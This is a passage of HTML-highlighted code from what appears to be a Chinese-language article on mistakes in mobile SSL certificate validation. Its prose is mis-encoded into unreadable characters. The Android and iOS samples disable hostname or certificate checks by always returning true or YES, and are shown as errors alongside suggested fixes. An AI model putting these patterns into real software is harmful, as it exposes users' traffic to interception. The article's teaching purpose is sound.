&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManagerFactory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManagerFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;algorithm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyStore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;TLS&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTrustManagers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;https://www.example.com/&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpsURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpsURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setSSLSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&quot;android-éŒ¯èª¤è™•ç†æƒ…æ³3&quot;&gt;Android éŒ¯èª¤è™•ç†æƒ…æ³3&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;https://www.example.com/&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpsURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpsURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHostnameVerifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSLSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ALLOW_ALL_HOSTNAME_VERIFIER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;æˆ–æ˜¯&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HostnameVerifier&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allHostVerifier&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HostnameVerifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt;     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLSession&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;5&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;ä¸Šè¿°å¯«æ³•ç•¥éäº†æ†‘è­‰ä¸­çš„ hostname æª¢æŸ¥ï¼Œå°è‡´å³ä½¿é€£ç·šç«¯èˆ‡æ†‘è­‰ä¸­æŒ‡å®šçš„ hostname ä¸ä¸€è‡´ä¹Ÿèƒ½é€šéã€‚è¼ƒç‚ºæ°ç•¶çš„åšæ³•æ˜¯ä¸ç‰¹åˆ¥è¨­å®šï¼Œè®“ä»–ä½¿ç”¨é è¨­çš„ DefaultHostnameVerifierï¼Œæˆ–æ˜¯æ¡ç”¨æ›´ç‚ºåš´è¬¹çš„ StrictHostnameVerifierã€‚&lt;/p&gt;

&lt;h4 id=&quot;ios-éŒ¯èª¤è™•ç†æƒ…æ³1&quot;&gt;iOS éŒ¯èª¤è™•ç†æƒ…æ³1&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;@implementation&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;NSURLRequest&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;(IgnoreSSL)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;allowsAnyHTTPSCertificateForHost:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;YES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;@end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;æ­¤æƒ…æ³ä½¿ç”¨åˆ° Framework ä¸­çš„ Private APIï¼Œé›–ç„¶é€™ç¨®å¯«æ³•æœƒå› ç‚ºä¸èƒ½é€šé Apple çš„å¯©æŸ¥è€Œä¸æœƒå‡ºç¾åœ¨ AppStore ä¸Š(ä½¿ç”¨å›é¿æŠ€å·§ä¸åœ¨é€™è¨è«–ç¯„åœå…§)ï¼Œä½†ä»æœ‰æ©Ÿæœƒåœ¨ç„¡éœ€ç¶“é Apple å¯©æŸ¥çš„ Enterprise App ä¸­ä½¿ç”¨ã€‚è¼ƒç‚ºé©ç•¶çš„åšæ³•æ˜¯ç”¨ â€œ#if DEBUGâ€ï¼Œâ€#endifâ€ åŒ…èµ·ä¾†ä»¥ç¢ºä¿è©²æ®µç¨‹å¼åœ¨ç·¨è­¯æ™‚åªèƒ½å°é–‹ç™¼ä¸­çš„ debug ç‰ˆä¸Šæœ‰ä½œç”¨ã€‚&lt;/p&gt;

&lt;h4 id=&quot;ios-éŒ¯èª¤è™•ç†æƒ…æ³2&quot;&gt;iOS éŒ¯èª¤è™•ç†æƒ…æ³2&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;canAuthenticateAgainstProtectionSpace:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLProtectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;protectionSpace&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveAuthenticationChallenge:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;useCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;forAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;continueWithoutCredentialForAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;ä¸Šé¢çš„åšæ³•æœƒè®“ä½¿ç”¨ NSURLConnection çš„é€£ç·šç•¥éæ†‘è­‰æª¢æŸ¥ï¼Œå®¹è¨±ä»»æ„æ†‘è­‰é€šéã€‚ä¸‹é¢ç¯€éŒ„ OWASP WIKI ä¸Šçš„ç¯„ä¾‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveAuthenticationChallenge:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;                    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;OSStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustEvaluate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errSecSuccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;autorelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt; 
